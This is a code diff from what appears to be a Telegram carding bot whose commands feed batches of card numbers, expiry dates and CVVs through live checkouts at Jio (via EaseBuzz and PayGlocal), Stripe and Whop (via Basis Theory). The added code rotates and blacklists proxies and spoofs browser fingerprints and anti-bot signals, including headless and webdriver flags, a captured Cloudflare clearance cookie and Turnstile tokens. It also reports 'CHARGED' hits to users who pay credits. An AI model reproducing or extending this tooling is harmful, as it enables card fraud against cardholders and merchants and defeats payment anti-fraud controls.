+            return pe(PREMIUM_EMOJI_IDS['approved'], '✅')
+        if status == 'TIMEOUT':
+            return pe(PREMIUM_EMOJI_IDS['time'], '⏰')
+        if status == 'PROXY_ERROR':
+            return pe(PREMIUM_EMOJI_IDS['error'], '🔌')
+        return pe(PREMIUM_EMOJI_IDS['error'], '⚠️')
+
     for idx, card in enumerate(cards, 1):
+        if isinstance(card, dict):
+            cur_card = f"{card.get('cc', '')}|{card.get('month', '')}|{card.get('year', '')}|{card.get('cvv', '')}"
+        else:
+            cur_card = str(card)
+
         try:
-            # Update progress
+            # Update progress: every finished card + the one being checked now
             progress_text = f"{pe(PREMIUM_EMOJI_IDS['globe'], '🌐')} <b>Site</b> ➳ {merchant_name}\n"
             progress_text += f"{pe(PREMIUM_EMOJI_IDS['money'], '💰')} <b>Amount</b> ➳ {price_display}\n"
             progress_text += f"{pe(PREMIUM_EMOJI_IDS['time'], '⚡')} <b>Status</b> ➳ Hitting\n"
@@ -19529,8 +22509,16 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 progress_text += f"{pe(PREMIUM_EMOJI_IDS['target'], '🎯')} <b>Success Url</b> ➳ N/A\n"
             
             progress_text += f"{pe(PREMIUM_EMOJI_IDS['stats'], '📊')} <b>Progress</b> ➳ {idx-1}/{len(cards)}\n\n"
-            progress_text += f"<code>{card.get('cc', '')}|{card.get('month', '')}|{card.get('year', '')}|{card.get('cvv', '')}</code>\n"
-            progress_text += f"    ⤷ {pe(PREMIUM_EMOJI_IDS['time'], '⏳')} Processing..."
+
+            _shown = live_lines[-18:]
+            if len(live_lines) > len(_shown):
+                progress_text += f"<i>… {len(live_lines) - len(_shown)} earlier result(s)</i>\n\n"
+            for _lc, _le, _lt in _shown:
+                _lt_short = _lt if len(_lt) <= 110 else _lt[:107] + "..."
+                progress_text += f"<code>{_lc}</code>\n    ⤷ {_le} <b>{_lt_short}</b>\n"
+
+            progress_text += f"<code>{cur_card}</code>\n"
+            progress_text += f"    ⤷ {pe(PREMIUM_EMOJI_IDS['time'], '⏳')} <b>Processing...</b>"
             
             await progress_msg.edit_text(progress_text, parse_mode=ParseMode.HTML)
         except:
@@ -19564,11 +22552,18 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             'time': result.get('time', 0),
             'attempts': len(result.get('attempts', []))
         })
+
+        # Feed the live log shown on the progress message
+        live_lines.append((
+            card_str,
+            _live_emoji(result.get('status', 'UNKNOWN')),
+            result.get('response') or 'Unknown'
+        ))
         
         print(f"📊 Result: {result.get('status', 'UNKNOWN')} - {result.get('response', 'Unknown')[:50]}")
         
-        if result.get('status') == 'SESSION_EXPIRED':
-            print("🛑 Checkout session is no longer active — stopping all remaining cards.")
+        if result.get('status') in ('SESSION_EXPIRED', 'TOS_REQUIRED'):
+            print("🛑 Fatal session state — stopping all remaining cards.")
             break
 
         if result['status'] == 'CHARGED':
@@ -19611,7 +22606,10 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 status_text = r['response'] if r['response'] else r['status']
                 response += f"    ⤷ {pe(PREMIUM_EMOJI_IDS['declined'], '❌')} <b>{status_text}</b>\n"
     else:
-        for r in card_results:
+        _cc_tail = card_results[-30:]
+        if len(card_results) > len(_cc_tail):
+            response += f"<i>… {len(card_results) - len(_cc_tail)} earlier result(s)</i>\n"
+        for r in _cc_tail:
             card = r['card']
             status = r['status']
             response_text = r['response']
@@ -19624,7 +22622,7 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 status_emoji = pe(PREMIUM_EMOJI_IDS['warning'], '⚠️')
             elif status == 'CHARGED':
                 status_emoji = pe(PREMIUM_EMOJI_IDS['charged'], '🔥')
-            elif status in ('SESSION_ERROR', 'SESSION_EXPIRED'):
+            elif status in ('SESSION_ERROR', 'SESSION_EXPIRED', 'TOS_REQUIRED'):
                 status_emoji = pe(PREMIUM_EMOJI_IDS['warning'], '⚠️')
             elif status == 'INSUFFICIENT_FUNDS':
                 status_emoji = pe(PREMIUM_EMOJI_IDS['money'], '💰')
@@ -19963,6 +22961,67 @@ def mask_proxy(proxy: str) -> str:
 JIO_TIMEOUT = 45
 
 
+def _jio_phone_arg(raw) -> str:
+    """Return a normalised 10-digit Indian mobile, or "" if not a phone."""
+    d = re.sub(r"\D", "", str(raw or ""))
+    if len(d) == 12 and d.startswith("91"):
+        d = d[2:]
+    elif len(d) == 11 and d.startswith("0"):
+        d = d[1:]
+    return d if len(d) == 10 and d[0] in "6789" else ""
+
+
+def _jio_confirm_order(jio_sess, bh, retries: int = 3):
+    """Ask Jio whether the recharge order actually completed.
+
+    Returns (True, data) / (False, data) / (None, {}) when it cannot tell.
+    A payment is only reported as a hit when this does not say "failed".
+    """
+    for _i in range(max(1, retries)):
+        try:
+            r = jio_sess.get(
+                "https://www.jio.com/api/jio-recharge-service/recharge/showConfirmation",
+                params={"t": int(time.time() * 1000)},
+                headers={**bh, "Referer": "https://www.jio.com/selfcare/recharge/status/"},
+                timeout=20,
+            )
+            if r.status_code == 200 and r.text.strip().startswith("{"):
+                data = r.json()
+                blob = json.dumps(data).lower()
+                if any(x in blob for x in ("recharge successful", "recharge_success",
+                                           "successfully recharged", "order completed",
+                                           "recharge completed")):
+                    return True, data
+
+                def _status(o):
+                    if isinstance(o, dict):
+                        for k, v in o.items():
+                            if "status" in str(k).lower() and isinstance(v, str):
+                                return v.lower()
+                            hit = _status(v)
+                            if hit:
+                                return hit
+                    elif isinstance(o, list):
+                        for x in o:
+                            hit = _status(x)
+                            if hit:
+                                return hit
+                    return ""
+
+                st = _status(data)
+                if st in ("success", "successful", "completed", "captured", "paid",
+                          "recharge_success", "sent_for_capture"):
+                    return True, data
+                if st in ("failed", "failure", "declined", "rejected", "cancelled"):
+                    return False, data
+            elif r.status_code == 401:
+                return None, {}
+        except Exception:
+            pass
+        time.sleep(1.2)
+    return None, {}
+
+
 def jio_hit(phone: str, amount: str, cc: str, mm: str, yy: str, cvv: str,
             proxy: str | None = None) -> dict:
     """Full Jio → EaseBuzz → PayGlocal checkout with proper status detection."""
@@ -20016,7 +23075,10 @@ def jio_hit(phone: str, amount: str, cc: str, mm: str, yy: str, cvv: str,
             timeout=JIO_TIMEOUT,
         )
         if r.status_code not in (200, 201):
-            result["error"] = f"Step 1 HTTP {r.status_code}: {r.text[:200]}"
+            if "NOT_SUBSCRIBED_USER" in (r.text or ""):
+                result["error"] = "Ye number Jio prepaid nahi hai (ya galat hai)"
+            else:
+                result["error"] = f"Step 1 HTTP {r.status_code}: {r.text[:200]}"
             result["status"] = "ERROR"
             print(f"❌ Step 1 failed: {result['error']}")
             return result
@@ -20276,45 +23338,130 @@ def jio_hit(phone: str, amount: str, cc: str, mm: str, yy: str, cvv: str,
 
     html_form = ccdc_json.get("htmlForm") or ""
     if not html_form or "easebuzz" not in html_form.lower():
+        # No 3DS form does NOT mean paid. The old code returned SUCCESS here
+        # and produced hits for payments that never settled. Require an
+        # explicit capture marker plus Jio's own order confirmation.
+        blob = json.dumps(ccdc_json).lower()
+        captured = any(x in blob for x in ("sent_for_capture", "captured",
+                                           "payment_success", "payment successful"))
+        confirmed, _cdata = _jio_confirm_order(jio_sess, bh)
         result["elapsed"] = round(time.time() - t0, 2)
-        result["status"] = "SUCCESS"
-        result["message"] = "Payment successful (no 3DS)"
-        print("✅ Payment successful (no 3DS required)")
+        if captured and confirmed is not False:
+            result["status"] = "CHARGED"
+            result["message"] = ("Payment successful • recharge confirmed"
+                                 if confirmed else
+                                 "Payment successful • recharge confirmation pending")
+            print(f"✅ Payment successful (no 3DS) — confirmed={confirmed}")
+        else:
+            result["status"] = "PENDING"
+            result["message"] = ("Payment not confirmed by Jio (no 3DS form returned)"
+                                 if confirmed is None else
+                                 "Payment captured but Jio recharge failed")
+            print("⚠️ No 3DS form and payment not confirmed — PENDING")
         return result
 
     # ── Step 9: EaseBuzz ACS redirect → x-gl-token ───────────────────────────
     print("📡 Step 9: Processing EaseBuzz 3DS...")
-    encdata_m = (re.search(r'name=["\']encdata["\']\s+value=["\']([^"\']+)["\']', html_form)
-                 or re.search(r'value=["\']([A-Za-z0-9+/=]+)["\'][^>]*name=["\']encdata["\']', html_form))
-    if not encdata_m:
+    html_form_clean = html.unescape(html_form or "")
+    eb_action = "https://pay.easebuzz.in/acs/v1/redirection"
+    eb_data = {}
+    try:
+        _soup = BeautifulSoup(html_form_clean, "html.parser")
+        _frm = _soup.find("form")
+        if _frm and _frm.get("action"):
+            eb_action = urllib.parse.urljoin("https://pay.easebuzz.in/", _frm.get("action"))
+        for _inp in _soup.find_all("input"):
+            _nm = (_inp.get("name") or "").strip()
+            if _nm:
+                eb_data[_nm] = _inp.get("value") or ""
+    except Exception:
+        pass
+    if not eb_data.get("encdata"):
+        encdata_m = (re.search(r'name=["\']encdata["\'][^>]*value=["\']([^"\']+)["\']', html_form_clean)
+                     or re.search(r'value=["\']([A-Za-z0-9+/=]+)["\'][^>]*name=["\']encdata["\']', html_form_clean))
+        if encdata_m:
+            eb_data["encdata"] = encdata_m.group(1)
+    if not eb_data.get("encdata"):
         result["error"] = "encdata not found in htmlForm"
         result["status"] = "ERROR"
         result["elapsed"] = round(time.time() - t0, 2)
         print("❌ encdata not found")
         return result
 
-    eb_sess = cf.Session(impersonate="chrome124")
-    r_eb = eb_sess.post(
-        "https://pay.easebuzz.in/acs/v1/redirection",
-        headers={"Content-Type": "application/x-www-form-urlencoded",
-                 "Origin": "https://pay.jio.com", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
-        data={"encdata": encdata_m.group(1)},
-        timeout=JIO_TIMEOUT,
-        allow_redirects=True,
-    )
-    m_gl = re.search(
-        r"window\.location\.href\s*=\s*[\"']https://api\.payglocal\.com/gl/payflow-ui/\?x-gl-token=([A-Za-z0-9._\-]+)[\"']",
-        r_eb.text,
-    )
-    if not m_gl:
-        result["steps"]["easebuzz_raw"] = r_eb.text[:500]
-        result["error"] = "x-gl-token not found"
-        result["status"] = "ERROR"
-        result["elapsed"] = round(time.time() - t0, 2)
-        print("❌ x-gl-token not found")
-        return result
+    def _gl_token_from(resp):
+        """Find x-gl-token in the response URL, redirect chain or body."""
+        urls = [getattr(resp, "url", "") or ""]
+        try:
+            urls += [h.headers.get("Location") or h.headers.get("location") or ""
+                     for h in (getattr(resp, "history", None) or [])]
+        except Exception:
+            pass
+        for _u in urls:
+            if not _u:
+                continue
+            try:
+                _q = urllib.parse.parse_qs(urllib.parse.urlparse(_u).query)
+                _v = (_q.get("x-gl-token") or [""])[0]
+            except Exception:
+                _v = ""
+            if _v:
+                return urllib.parse.unquote(_v)
+        _txt = getattr(resp, "text", "") or ""
+        for _pat in (r"x-gl-token=([A-Za-z0-9._%\-]+)",
+                     r"x-gl-token%3D([A-Za-z0-9._%\-]+)",
+                     r'x-gl-token["\']?\s*[:=]\s*["\']?([A-Za-z0-9._%\-]+)'):
+            _m = re.search(_pat, _txt)
+            if _m:
+                return urllib.parse.unquote(_m.group(1))
+        return ""
 
-    gl_token = m_gl.group(1)
+    eb_sess = cf.Session(impersonate="chrome124", proxies=proxies)
+    eb_headers = {"Content-Type": "application/x-www-form-urlencoded",
+                  "Origin": "https://pay.jio.com",
+                  "Referer": "https://pay.jio.com/",
+                  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
+    r_eb = eb_sess.post(eb_action, headers=eb_headers, data=eb_data,
+                        timeout=JIO_TIMEOUT, allow_redirects=False)
+
+    _loc = ""
+    try:
+        _loc = r_eb.headers.get("location") or r_eb.headers.get("Location") or ""
+    except Exception:
+        pass
+
+    gl_token = _gl_token_from(r_eb)
+    if not gl_token and _loc:
+        _full = urllib.parse.urljoin("https://pay.easebuzz.in/", _loc)
+        try:
+            _q = urllib.parse.parse_qs(urllib.parse.urlparse(_full).query)
+            gl_token = urllib.parse.unquote((_q.get("x-gl-token") or [""])[0])
+        except Exception:
+            gl_token = ""
+        if not gl_token:
+            try:
+                r_eb = eb_sess.get(_full, headers={"User-Agent": eb_headers["User-Agent"],
+                                                    "Referer": "https://pay.jio.com/"},
+                                   timeout=JIO_TIMEOUT, allow_redirects=True)
+                gl_token = _gl_token_from(r_eb)
+            except Exception:
+                pass
+
+    if not gl_token:
+        _raw = getattr(r_eb, "text", "") or ""
+        result["steps"]["easebuzz_raw"] = _raw[:800]
+        _low = _raw.lower()
+        if any(k in _low for k in ("otp", "one time password", "3d secure",
+                                   "3ds", "authentication", "verify")):
+            result["status"] = "3DS_REQUIRED"
+            result["message"] = "Bank OTP/3DS page returned — manual OTP required"
+            print("🔐 EaseBuzz returned an OTP/3DS page")
+        else:
+            result["status"] = "ERROR"
+            result["message"] = (f"x-gl-token not found (easebuzz "
+                                 f"http {getattr(r_eb, 'status_code', '?')})")
+            print("❌ x-gl-token not found")
+        result["elapsed"] = round(time.time() - t0, 2)
+        return result
     gid = _decode_jwt_payload(gl_token).get("x-gl-gid", "")
     print("✅ Step 9: x-gl-token obtained")
 
@@ -20599,10 +23746,22 @@ def jio_hit(phone: str, amount: str, cc: str, mm: str, yy: str, cvv: str,
         else:
             result["status"] = "DECLINED"
             result["message"] = ipay_json.get("message", "Card declined")
-    elif ipay_status in ["SUCCESS", "SUCCEEDED", "COMPLETED", "CAPTURED"]:
-        result["status"] = "CHARGED"
-        result["message"] = "Payment successful"
-        print("✅ PAYMENT SUCCESSFUL!")
+    elif ipay_status == "AUTHORIZED":
+        result["status"] = "PENDING"
+        result["message"] = "Bank authorized — capture pending"
+        print("⏳ Payment authorized, capture pending")
+    elif ipay_status in ["SUCCESS", "SUCCEEDED", "COMPLETED", "CAPTURED", "SENT_FOR_CAPTURE"]:
+        confirmed, _cdata = _jio_confirm_order(jio_sess, bh)
+        if confirmed is False:
+            result["status"] = "PENDING"
+            result["message"] = "Payment captured but Jio recharge not confirmed"
+            print("⚠️ Payment captured but Jio confirmation failed")
+        else:
+            result["status"] = "CHARGED"
+            result["message"] = ("Payment successful • recharge confirmed"
+                                 if confirmed else
+                                 "Payment successful • recharge confirmation pending")
+            print(f"✅ PAYMENT SUCCESSFUL! confirmed={confirmed}")
     else:
         result["status"] = ipay_status
         result["message"] = ipay_json.get("message", ipay_status)
@@ -20699,7 +23858,9 @@ def format_jio_response(result: Dict, card: str, compact: bool = False) -> Tuple
     # ============ Determine status emoji and text ============
     
     # FIRST: Check for 3DS - this takes priority over INPROGRESS
-    if has_3ds:
+    if has_3ds and status_lower not in (
+            "SUCCESS", "SUCCEEDED", "COMPLETED", "CAPTURED", "CHARGED",
+            "SENT_FOR_CAPTURE"):
         status_emoji = safe_premium_emoji("lock", "🔐")
         status_text = "3D REQUIRED"
         status_category = "approved"  # 3DS means the card is live/valid
@@ -20825,8 +23986,6 @@ def _jhit_is_retryable_error(result: dict) -> bool:
 # ============ JIO COMMAND HANDLER ============
 @check_gateway("jhit")
 @check_free_hit_limit("jhit")
-@check_gateway("jhit")
-@check_free_hit_limit("jhit")
 async def jhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """
     Jio Auto-Hitter command - supports multiple cards
@@ -20857,8 +24016,16 @@ async def jhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    phone = args[0]
-    amount = args[1]
+    # Users often send <amount> <phone> instead of <phone> <amount>.
+    # Detect the 10-digit mobile and keep the other value as the amount.
+    _a0, _a1 = args[0], args[1]
+    _p0, _p1 = _jio_phone_arg(_a0), _jio_phone_arg(_a1)
+    if _p1 and not _p0:
+        phone, amount = _p1, _a0
+    else:
+        phone, amount = (_p0 or _a0), _a1
+    phone = _jio_phone_arg(phone) or phone
+    amount = re.sub(r"[^0-9.]", "", str(amount)) or str(amount)
     
     # ============ EXTRACT ALL CARDS ============
     cards = []
@@ -20923,28 +24090,16 @@ async def jhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         deduct_user_credits(user_id, len(cards))
         print(f"💎 User {user_id} used {len(cards)} credits for Jio multi-check. Remaining: {get_user_credits(user_id)}")
 
-    # ============ GET PROXIES (for automatic rotation) ============
-    # Only ever use the caller's OWN proxies. If the caller has none,
-    # connect directly (proxy = None). All of the caller's proxies are
-    # collected so a timed-out card can be retried on a different one.
-    user_proxies = []
-    try:
-        _all_proxies = load_stripe_proxies()
-        _raw = _all_proxies.get(str(user_id), []) if isinstance(_all_proxies, dict) else []
-        if isinstance(_raw, str):
-            _raw = [_raw]
-        for _p in (_raw or []):
-            _norm = _jhit_normalize_proxy(_p)
-            if _norm and _norm not in user_proxies:
-                user_proxies.append(_norm)
-    except Exception as e:
-        print(f"\u26a0\ufe0f [jhit] proxy lookup failed: {e}")
-
+    # ============ GET PROXIES (GLOBAL POOL + ROTATION) ============
+    # /jhit rotates through the shared global proxy pool. Dead exits are
+    # blacklisted by the shared _ext_mark_dead() helper and dropped from this
+    # run, so the next card starts on a different IP. Empty pool -> direct.
+    user_proxies = _ext_proxy_list(user_id, 3)
     if user_proxies:
-        print(f"\U0001f50c {len(user_proxies)} proxy(ies) for rotation: "
+        print(f"\U0001f50c Global pool: {len(user_proxies)} proxy(ies) for rotation: "
               + ", ".join(mask_proxy(_p) for _p in user_proxies))
     else:
-        print("\U0001f50c No proxies - direct connection")
+        print("\U0001f50c Global pool empty/disabled - direct connection")
 
     # ============ START PROCESSING CARDS ============
     total_cards = len(cards)
@@ -21020,7 +24175,17 @@ async def jhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 )
                 _st = (result.get("status") or "UNKNOWN").upper()
                 # Only network errors rotate - real declines stop here.
-                if _st != "ERROR" or not _jhit_is_retryable_error(result):
+                if _st == "ERROR" and _jhit_is_retryable_error(result):
+                    if _attempt_proxy:
+                        _ext_mark_dead(_attempt_proxy)
+                        try:
+                            user_proxies.remove(_attempt_proxy)
+                        except ValueError:
+                            pass
+                        print(f"\U0001f6ab [jhit] proxy blacklisted: {mask_proxy(_attempt_proxy)}")
+                else:
+                    if _attempt_proxy:
+                        _EXT_GOOD_PROXY[user_id] = _attempt_proxy
                     break
                 if _ai < len(attempt_order) - 1:
                     _next = attempt_order[_ai + 1]
@@ -21178,12 +24343,6 @@ async def jhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except Exception as e:
             print(f"⚠️ [HIT NOTIFICATION] Error: {e}")
     
-    user_manager.increment_checks(user_id, len(results))
-    print(f"✅ Jio multi-check complete for user {user_id}: {charged_count} charged, {len(results)} checked")
-
-
-
-
 # ============ NEW STRIPE API CHECK FUNCTION ============
 
 async def check_card_new_stripe(card: str, proxy: str = None) -> Dict:
@@ -25628,9 +28787,14 @@ async def send_hit_notification(context: ContextTypes.DEFAULT_TYPE,
         price_display = price_override
     else:
         try:
-            price_float = float(price.replace('$', '').replace('₹', ''))
-            # Dollar sign at the END, e.g. 0.99$
-            price_display = f"{price_float:.2f}$"
+            _raw_price = str(price)
+            _inr = ("₹" in _raw_price or "INR" in _raw_price.upper()
+                    or str(gateway).strip().lower().startswith(("jio", "magicpin")))
+            price_float = float(re.sub(r"[^0-9.]", "", _raw_price) or 0)
+            # INR keeps the symbol in front (₹11.00); everything else keeps
+            # the existing trailing-dollar style (0.99$).
+            price_display = (f"₹{price_float:.2f}" if _inr
+                             else f"{price_float:.2f}$")
         except:
             price_display = price
     
@@ -25901,6 +29065,11 @@ async def auto_detect_reply_with_command(update: Update, context: ContextTypes.D
     # (group 1), which deducts credits and runs the PayPal-key check. Bail
     # here so a replied /pp is not ALSO single-checked by single_check_paypal_with_gif.
     if command.split('@')[0] in ('/pp', '/mpp'):
+        return
+
+    # /ch and /chase belong to the external Chase gateway (group-1 handler);
+    # bail so the card auto-detector does not route it elsewhere.
+    if command.split('@')[0] in ('/ch', '/chase'):
         return
 
     # /addapi & /bulkaddapi manage the API pool and are routed through
@@ -26188,6 +29357,14 @@ class UserManager:
         "st1_charge",        # /st1 (ST1 $1 Charge) — free users: 1 credit per check
         "stripe_chk",        # /chk (Stripe Auth) — free users: 1 credit per check
         "coustom_charged",   # /sy (COUSTOM CHARGED) — free users: 1 credit per card
+
+        "pway",              # /pway (Payway 1$)
+
+        "anet",              # /anet (Authorize.net 1$)
+
+        "chase",             # /ch (Chase Paymentech)
+
+        "sauth",             # /sa (Stripe Auth 0$)
     ]
 
     # ─────────────────────────────────────────────────────────────
@@ -26254,6 +29431,10 @@ class UserManager:
                 "jhit",
                 "square_1usd",
                 "coustom_charged",
+                "pway",
+                "anet",
+                "chase",
+                "sauth",
             ],
             "can_add_autosopi_sites": True,
             "can_mass_check": True,
@@ -26315,6 +29496,10 @@ class UserManager:
                 "bt_kaffn8",     # /bt reply-flow checks this key
                 "square_1usd",
                 "coustom_charged",
+                "pway",
+                "anet",
+                "chase",
+                "sauth",
             ],
             "can_add_autosopi_sites": True,
             "can_mass_check": True,
@@ -26372,6 +29557,10 @@ class UserManager:
                 "stripe_sk",
                 "square_1usd",
                 "coustom_charged",
+                "pway",
+                "anet",
+                "chase",
+                "sauth",
             ],
             "can_add_autosopi_sites": True,
             "can_mass_check": True,
@@ -76250,6 +79439,18 @@ from telegram.constants import ParseMode
 # ── Constants ───────────────────────────────────────────────────────────────
 WHOP_API_LEGACY = "https://whop.com/api/v1"
 WHOP_API_NEW    = "https://api.whop.com/api/v1"
+
+# Current live API version (captured 2026-11-07). Whop bumps this every few
+# weeks; override with WHOP_API_VERSION without touching the code.
+WHOP_API_VERSION = os.environ.get("WHOP_API_VERSION", "2026-11-06")
+
+# Optional material captured from a real browser session (see /whop notes):
+#   WHOP_COOKIE    full cookie jar incl. cf_clearance + _whop_ssk
+#   WHOP_SSK       value of _whop_ssk (x-ssk header)
+#   WHOP_CHALLENGE "turnstile_invisible <JWT>" for confirmation_tokens
+WHOP_COOKIE    = os.environ.get("WHOP_COOKIE", "").strip()
+WHOP_SSK       = os.environ.get("WHOP_SSK", "").strip()
+WHOP_CHALLENGE = os.environ.get("WHOP_CHALLENGE", "").strip()
 BT_TOKENIZE_URL = "https://api.basistheory.com/tokenize"
 BASIS_KEY       = "key_prod_us_pub_Ew4Bw1f81FPoqphvpuX1VR"
 WHOP_RETURN_URL = "https://whop.com/order-complete"
@@ -76396,7 +79597,7 @@ async def whop_resolve_plan_from_product(store_slug: str, product_slug: str,
     ]
     headers = {
         "accept":           "application/json",
-        "api-version-date": "2026-09-06",
+        "api-version-date": WHOP_API_VERSION,
         "user-agent":       WHOP_UA,
     }
 
@@ -76465,8 +79666,34 @@ def whop_parse_card(text: str) -> Optional[Dict]:
     return {"cc": cc, "month": month, "year": year, "cvv": cvv}
 
 
+def whop_ssk_from_cookie(cookie: str) -> str:
+    """Pull _whop_ssk out of a captured cookie jar (x-ssk header value)."""
+    m = re.search(r"(?:^|;\s*)_whop_ssk=([^;]+)", cookie or "")
+    return m.group(1).strip() if m else ""
+
+
+def whop_browser_behavior() -> Dict:
+    """browser_behavior_v1 as the real checkout page sends it."""
+    elapsed = random.randint(20000, 90000)
+    hidden = random.randint(100, 4000)
+    return {
+        "version": 1,
+        "elapsed_ms": elapsed,
+        "visible_ms": max(0, elapsed - hidden),
+        "hidden_ms": hidden,
+        "submit_count": 1,
+        "fields": {},
+    }
+
+
 def whop_build_cookie(session_id: str, client_secret: str,
                       sig_id: str = "") -> str:
+    if WHOP_COOKIE:
+        base = WHOP_COOKIE
+        if f"whop_checkout_key_{session_id}=" not in base:
+            base = f"{base}; whop_checkout_key_{session_id}={client_secret}"
+        return base
+
     jar = {
         "whop_sig_id":         sig_id or str(uuid.uuid4()),
         "whop-frosted-theme":  "appearance:light",
@@ -76496,7 +79723,7 @@ async def whop_create_session_legacy(plan_id: str, checkout_url: str,
         headers = {
             "accept":              "*/*",
             "content-type":        "application/json",
-            "api-version-date":    "2026-09-06",
+            "api-version-date":    WHOP_API_VERSION,
             "whop-private-schema": "true",
             "user-agent":          WHOP_UA,
             "origin":              "https://whop.com",
@@ -76522,7 +79749,7 @@ async def whop_create_session_new(plan_id: str, checkout_url: str,
     headers = {
         "accept":           "*/*",
         "content-type":     "application/json",
-        "api-version-date": "2026-09-06",
+        "api-version-date": WHOP_API_VERSION,
         "user-agent":       WHOP_UA,
         "origin":           origin,
         "referer":          checkout_url,
@@ -76548,6 +79775,161 @@ async def whop_create_session_new(plan_id: str, checkout_url: str,
 # ═══════════════════════════════════════════════════════════════════════════
 #  STEP 2 — TOKENISE CARD
 # ═══════════════════════════════════════════════════════════════════════════
+
+# ══════════════════════════════════════════════════════════════════════
+#  BASIS THEORY "ELEMENTS" TOKENISATION  (naya browser flow)
+#
+#  Card number, expiry and CVC are tokenised in three steps, and the two
+#  PATCH calls are authenticated with the BT *session key* (not the public
+#  key). This is what the live whop checkout does since the BT upgrade.
+# ══════════════════════════════════════════════════════════════════════
+WHOP_BT_BASE = "https://js.basistheory.com"
+WHOP_BT_PUBLIC_KEY = "key_prod_us_pub_Ew4Bw1f81FPoqphvpuX1VR"
+WHOP_BT_CONTAINER_FALLBACK = ("/card-assembly/"
+                              "cda4721bfd122ff8420a0bf4f47ea32e14125ef7d90d933bacb1a0b7fa9e82dd/")
+
+
+def _whop_bt_device_info() -> dict:
+    return {
+        "uaBrands": [{"brand": "Not:A-Brand", "version": "8"},
+                     {"brand": "Chromium", "version": "156"},
+                     {"brand": "Google Chrome", "version": "156"}],
+        "uaMobile": False,
+        "uaPlatform": "Windows",
+        "languages": ["en-GB", "en-US", "en"],
+        "timeZone": "Asia/Calcutta",
+        "cookiesEnabled": True,
+        "localStorageEnabled": True,
+        "sessionStorageEnabled": True,
+        "platform": "Win32",
+        "hardwareConcurrency": 12,
+        "deviceMemoryGb": 16,
+        "screenWidth": 1920, "screenHeight": 1080,
+        "screenAvailWidth": 1920, "screenAvailHeight": 1032,
+        "innerWidth": 1186, "innerHeight": 945,
+        "devicePixelRatio": 1,
+        "maxTouchPoints": 0,
+        "network": {},
+        "plugins": ["PDF Viewer", "Chrome PDF Viewer", "Chromium PDF Viewer"],
+        "mimeTypes": ["application/pdf", "text/pdf"],
+        "webdriver": False,
+        "suspectedHeadless": False,
+        "webglVendor": "Google Inc. (NVIDIA)",
+        "webglRenderer": "ANGLE (NVIDIA, NVIDIA GeForce GTX 1660 Ti Direct3D11 vs_5_0 ps_5_0, D3D11)",
+    }
+
+
+async def whop_bt_tokenise(card: Dict, proxy: str = None,
+                           account_id: str = "") -> Optional[str]:
+    """Tokenise a card through the BT Elements API. Returns the token id."""
+    cc = re.sub(r"\D", "", str(card.get("cc") or ""))
+    mm = str(card.get("month") or "").zfill(2)
+    yy = str(card.get("year") or "")
+    cvv = str(card.get("cvv") or "")
+    if not cc or not mm or not yy or not cvv:
+        return None
+    year = int(re.sub(r"\D", "", yy) or 0)
+    if year and year < 100:
+        year += 2000
+
+    device = _whop_bt_device_info()
+    dev_b64 = base64.b64encode(json.dumps(device).encode()).decode()
+
+    bt_headers = {
+        "accept": "*/*",
+        "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
+        "bt-api-key": WHOP_BT_PUBLIC_KEY,
+        "content-type": "application/json",
+        "origin": WHOP_BT_BASE,
+        "referer": f"{WHOP_BT_BASE}/web-elements/2.12.2/hosted-elements/data-element.html?element_id",
+        "sec-ch-ua": '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": '"Windows"',
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-origin",
+        "user-agent": WHOP_UA,
+    }
+
+    try:
+        async with whop_client(proxy, timeout=40.0) as c:
+            # 1) device session
+            r = await c.post(f"{WHOP_BT_BASE}/api/sessions",
+                             json={"deviceInfo": device}, headers=bt_headers)
+            try:
+                d = r.json()
+            except Exception:
+                d = {}
+            session_key = d.get("session_key", "")
+            nonce = d.get("nonce", "")
+            if not session_key:
+                print(f"⚠️ [WHOP-BT] session {r.status_code}: {str(r.text)[:120]}")
+                return None
+
+            # 2) whop card container (falls back to the known container)
+            container = ""
+            if account_id and nonce:
+                try:
+                    r5 = await c.post(
+                        "https://whop.com/api/v1/payment_method_types/card/session",
+                        json={"account_id": account_id, "nonce": nonce},
+                        headers={"accept": "*/*", "content-type": "application/json",
+                                 "api-version-date": WHOP_API_VERSION,
+                                 "origin": "https://whop.com",
+                                 "referer": "https://whop.com/",
+                                 "user-agent": WHOP_UA,
+                                 "whop-private-schema": "true"})
+                    sc = (((r5.json() or {}).get("session") or {}).get("container") or "")
+                    if sc:
+                        container = sc if sc.startswith("/") else "/" + sc
+                        if not container.endswith("/"):
+                            container += "/"
+                except Exception as e:
+                    print(f"⚠️ [WHOP-BT] container lookup: {e}")
+            container = container or WHOP_BT_CONTAINER_FALLBACK
+
+            # 3) token with the card number only
+            expires_at = (datetime.now(timezone.utc) + timedelta(hours=1)).strftime(
+                "%Y-%m-%dT%H:%M:%S.000Z")
+            r6 = await c.post(
+                f"{WHOP_BT_BASE}/api/tokens",
+                json={"type": "card", "containers": [container],
+                      "expires_at": expires_at, "data": {"number": cc}},
+                headers={**bt_headers, "bt-device-info": dev_b64})
+            try:
+                tok = (r6.json() or {}).get("id")
+            except Exception:
+                tok = None
+            if not tok:
+                print(f"⚠️ [WHOP-BT] token {r6.status_code}: {str(r6.text)[:140]}")
+                return None
+
+            # 4) expiry, then CVC — both authenticated with the session key
+            patch_headers = {**bt_headers, "bt-api-key": session_key,
+                             "bt-device-info": dev_b64,
+                             "content-type": "application/merge-patch+json"}
+            try:
+                await c.patch(
+                    f"{WHOP_BT_BASE}/api/tokens/{tok}",
